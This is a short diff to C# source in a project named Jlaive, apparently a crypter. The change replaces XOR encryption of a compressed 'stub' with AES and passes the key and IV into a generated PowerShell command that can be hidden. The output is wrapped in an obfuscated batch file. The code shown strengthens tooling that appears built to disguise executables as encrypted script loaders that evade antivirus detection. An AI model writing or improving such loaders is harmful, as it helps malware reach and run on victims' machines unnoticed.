@@ -3,6 +3,7 @@ using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Security.Cryptography;
 using System.Text;
 using Microsoft.CSharp;
 
@@ -82,11 +83,12 @@ namespace Jlaive
             File.Delete(tempfile);
 
             Console.WriteLine("Encrypting stub...");
-            string key = RandomString(20, rng);
-            byte[] encrypted = XORCrypt(Compress(stubbytes), key);
+            AesManaged aes = new AesManaged();
+            byte[] encrypted = Encrypt(Compress(stubbytes), aes.Key, aes.IV);
 
             Console.WriteLine("Creating PowerShell command...");
-            string command = StubGen.CreatePS(key, _hidden, rng);
+            string command = StubGen.CreatePS(aes.Key, aes.IV, _hidden, rng);
+            aes.Dispose();
 
             Console.WriteLine("Constructing batch file...");
             StringBuilder toobf = new StringBuilder();
